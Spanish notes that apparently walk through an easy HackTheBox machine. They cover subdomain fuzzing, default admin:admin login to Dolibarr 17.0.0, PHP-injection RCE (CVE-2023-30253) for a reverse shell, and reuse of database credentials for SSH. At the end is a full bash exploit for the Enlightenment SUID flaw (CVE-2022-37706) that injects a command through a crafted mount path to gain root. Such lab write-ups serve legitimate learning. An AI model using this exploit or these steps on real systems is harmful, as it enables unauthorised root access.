____
- Tags: #easy   #acitve
______
# ENUMERACIÓN

#### NMAP

![[Pasted image 20240610130855.png]]

Metiéndome en la web veo que abajo del todo hay un dominio **Board.htb** que le añado a mi **/etc/hosts** para fuzzear más adelante por sub-dominios.

![[Pasted image 20240610143734.png|800]]
### FUZZING DE SUB-DOMINIOS CON: **WFUZZ**

![[Captura de pantalla 2024-06-10 143441.png|1100]]

Vemos que encontramos un sub-dominio que añadimos a nuestro **/etc/hosts** para poder acceder a él. Una vez añadido este sub-dominio nos lleva a un panel de autenticación de una aplicación llamada **Dolibarr**  con una versión la **17.0.0**, así que investigaremos un poco que es este software.

### TECNOLOGÍAS: **DOLIBAR VERSIÓN 17.0.0**, **PHP 8.2.8** 

Dolibarr es un software de gestión empresarial de código abierto que se utiliza para administrar diversas operaciones comerciales. Es un ERP (Enterprise Resource Planning) y CRM (Customer Relationship Management) que ofrece una amplia gama de funcionalidades para pequeñas y medianas empresas.

Dolibarr es altamente modular, lo que significa que los usuarios pueden activar o desactivar módulos según las necesidades específicas de su negocio. Su naturaleza de código abierto permite que los desarrolladores personalicen y amplíen sus funcionalidades, lo que lo hace una opción flexible y adaptable para diversas industrias y tipos de negocio.

### FUZZIND DE DIRS EN EL SUB-DOMINIO CRM CON: **GOBUSTER**

![[Pasted image 20240611130745.png|750]]
__________
# PASANDO EL PANEL DE AUTENTICACIÓN

Paso el panel de autenticación con las credenciales **admin:admin**. 

![[Pasted image 20240612112958.png]]

Buscando por internet veo que **Dolibarr 17.0.0** tiene un **CVE-2023-30253**, así que vamos haber en que consiste
#### **CVE-2023-30253**

Con el complemento del sitio web CMS habilitado, un atacante autenticado pude obtener la ejecución remota de comandos mediante la inyección de código PHP sin pasar las restricciones de la aplicación. En principio como vemos en la imagen de abajo parece que no nos va a interpretar código PHP que la configuración y la sanitización esta bien desarrollada, pero se puede inyectar código PHP metiéndole en lugar de empezar con las etiquetas PHP en minúsculas empezamos en mayúsculas la aplicación lo interpreta pudiendo ejecutar comandos. 
A continuación dejó el enlace donde explican la vulnerabilidad → [**LINK**](https://www.swascan.com/security-advisory-dolibarr-17-0-0/). 

![[Pasted image 20240613123049.png|1200]]

![[Pasted image 20240612123913.png]]

Con el siguiente código que dejó abajo nos enviamos una rever-shell.


![[Captura de pantalla 2024-06-13 121753.png]]
_________________________________
# DENTRO DE LA MÁQUINA

Una vez dentro de la máquina como **www-data** con una consola interactiva, veo en el **/etc/passwd** que hay un usuario con un directorio y una bash con nombre **larissa**.

![[Captura de pantalla 2024-06-13 122013.png]]

Dentro del directorio del proyecto buscando un poco veo un archivo **conf.php** con unas credenciales para la base de datos del localhost mysql.  Me meto dentro de la base de datos con estas credenciales y veo que es bastante extensa y parece que almacena información de clientes, así que lo que intento es entrar por ssh como el usuario larissa con esta credencial que he encontrado y efectivamente la autenticación es valida y consigo escalar al **user larissa** y encontrar la primer flag en su home.

![[Captura de pantalla 2024-06-12 132542.png]]
__________
## ESCALADA A ROOT

Listando por permisos SUID desde la raíz veo que hay uno que me llama la atención que no había visto nunca. **Enlightenment** es un gestor de ventanas para Linux y buscando por internet de las primas búsquedas que me aparecen es que pude realizarse una escalada de privilegios, así que empiezo a investigar y a tirar por este camino antes de buscar nada más para ver si puedo escalar a root.

![[Captura de pantalla 2024-06-13 124622.png]]

![[Pasted image 20240613130027.png]]

![[Pasted image 20240613130711.png]]

Veo la versión de **Enlightenment** y veo que hay exploit para versiones más nuevas así que me imagino que valdrán para explotar esta versión. Efectivamente logó explotarlo y escalar a root. Dejó a continuación el código para la escalada de privilegios en bash.

```bash
#/usr/bin/bash
#author: bits

echo "CVE-2022-37706"
echo "[+] Buscando archivo SUID vulnerable..."
echo "[+] Esto puede tardar unos segundos...."

# PROBLMEA ACTUAL

file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null)
if [ -z "$file" ];
then
  echo "[!] No se pudo encontrar el archvio SUID vulnerable"
  exit 1
fi

echo "[+] Binario SUID vulnerable encontrado"
echo "[*] VAMOS A INTENTAR ABRIR UNA SHELL ROOT"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/bash" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Bienvenido a la madrigurea del root ;)"

${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```

![[Captura de pantalla 2024-06-12 135415.png]]


